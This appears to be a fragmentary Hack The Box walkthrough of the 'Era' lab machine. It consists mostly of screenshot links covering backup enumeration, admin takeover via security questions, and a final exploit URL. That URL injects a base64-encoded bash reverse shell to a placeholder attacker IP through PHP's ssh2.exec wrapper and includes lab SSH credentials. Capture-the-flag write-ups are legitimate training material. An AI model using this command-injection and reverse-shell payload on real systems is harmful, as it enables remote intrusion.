...
![Era Homepage](/assets/img/htb/era/era%20webpage.png)
...
![File.era.htb webpage](/assets/img/htb/era/file.era.htb%20webpage.png)
...
![Register Page](/assets/img/htb/era/register.png)
...
![Login page](/assets/img/htb/era/login.png)

### Site Backup

![Manage Files page](/assets/img/htb/era/manage%20files.png)
...
![Upload Files page](/assets/img/htb/era/upload%20files.png)
...
![Upload Successful](/assets/img/htb/era/upload%20successful.png)
...
![PHPSESSID](/assets/img/htb/era/phpsessid.png)
...
We have two hits: 54 and 150. Let's first check ID 54. The download link would be at [http://file.era.htb/download.php?id=54](http://file.era.htb/download.php?id=54).

![ID 54](/assets/img/htb/era/ID%2054%20site%20backup.png)
...
![Database Browser for SQLite](/assets/img/htb/era/DB%20Browser%20for%20SQLite.png)

We have three tables available: files, sqlite_sequence, and users. We can check the `users` table first.

![Users Table](/assets/img/htb/era/users%20table.png)
...
Eric Homepage:
![Eric](/assets/img/htb/era/eric.png)

Yuri Homepage:
![Yuri](/assets/img/htb/era/yuri.png)
...
![Login Through Security Questions](/assets/img/htb/era/login%20security%20questions.png)

Using the answers from above, we can try to login to the admin user.

![Incorrect Answers](/assets/img/htb/era/incorrect.png)
...
![Update Security Questions](/assets/img/htb/era/update%20security%20questions.png)
...
![Update Admin Security Questions](/assets/img/htb/era/update%20admin%20security%20questions.png)
...
![Logging into Admin User](/assets/img/htb/era/admin%20logging%20in.png)

![Admin Page](/assets/img/htb/era/admin%20page.png)
...
[http://file.era.htb/download.php?id=54&show=true&format=ssh2.exec://eric:eric_pass@127.0.0.1/bash%20%2Dc%20%27printf%20KGJhc2ggPiYgL2Rldi90Y3AvWW91cl9BdHRhY2tlcl9JUC9Zb3VyX0xpc3RlbmVyX1BvcnQgMD4mMSkgJg%3D%3D%7Cbase64%20%2Dd%7Cbash%27;](http://file.era.htb/download.php?id=54&show=true&format=ssh2.exec://eric:america@127.0.0.1/bash%20%2Dc%20%27printf%20KGJhc2ggPiYgL2Rldi90Y3AvWW91cl9BdHRhY2tlcl9JUC9Zb3VyX0xpc3RlbmVyX1BvcnQgMD4mMSkgJg%3D%3D%7Cbase64%20%2Dd%7Cbash%27;)
